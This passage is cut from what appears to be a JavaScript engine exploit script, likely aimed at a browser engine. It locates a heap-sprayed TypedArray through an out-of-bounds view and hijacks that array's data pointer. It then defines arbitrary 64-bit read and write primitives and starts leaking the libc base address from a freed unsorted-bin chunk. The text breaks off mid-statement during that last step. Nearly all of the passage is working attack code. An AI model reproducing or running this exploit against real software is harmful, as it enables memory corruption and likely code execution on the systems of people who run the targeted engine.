eparate from\n// JSArrayBuffer.data. We need to corrupt this to achieve arbitrary access.\n\nlet arbPtrOffset = -1;\nlet arbSprayIdx = -1;\nlet origArbPtr = 0n;\n\nfor (let si = 0; si < foundStructs.length; si++) {\n    let struct = foundStructs[si];\n    let dataPtr = struct.dataPtr;\n    let dataPtrInAB = struct.offset + 2;\n\n    // Look for the same pointer value nearby - this is the TypedArray\'s u.array.ptr\n    for (let i = dataPtrInAB + 1; i < Math.min(dataPtrInAB + 50, oobView.length); i++) {\n        if (oobView[i] === dataPtr) {\n            let dataOobIndex = Number((dataPtr - oobBase) / 8n);\n            if (dataOobIndex >= 0 && dataOobIndex < oobView.length) {\n                let marker = oobView[dataOobIndex];\n                if ((marker & 0xFFFF00000000n) === 0xCAFE00000000n) {\n                    let sprayIdx = Number(marker & 0xFFFFFFFFn);\n                    if (sprayIdx >= 0 && sprayIdx < SPRAY_COUNT) {\n                        arbPtrOffset = i;\n                        arbSprayIdx = sprayIdx;\n                        origArbPtr = dataPtr;\n                        break;\n                    }\n                }\n            }\n        }\n    }\n    if (arbPtrOffset >= 0) break;\n}\n\nlet victimView = sprayViews[arbSprayIdx];\n\n// ====================\n// STEP 6: Define arbitrary read/write primitives\n// ====================\nfunction arbRead64(addr) {\n    oobView[arbPtrOffset] = addr;  // Redirect TypedArray\'s data pointer\n    let val = victimView[0];       // Read from new location\n    oobView[arbPtrOffset] = origArbPtr;  // Restore\n    return val;\n}\n\nfunction arbWrite64(addr, val) {\n    oobView[arbPtrOffset] = addr;\n    victimView[0] = val;\n    oobView[arbPtrOffset] = origArbPtr;\n}\n\n// ====================\n// STEP 7: Leak libc base via unsorted bin\n// ====================\n// Resize a large buffer to get it freed to unsorted bin\n// The freed chunk\'s fd pointer points to main_arena + 0x60\nlet libcLeakAB = new ArrayBuffe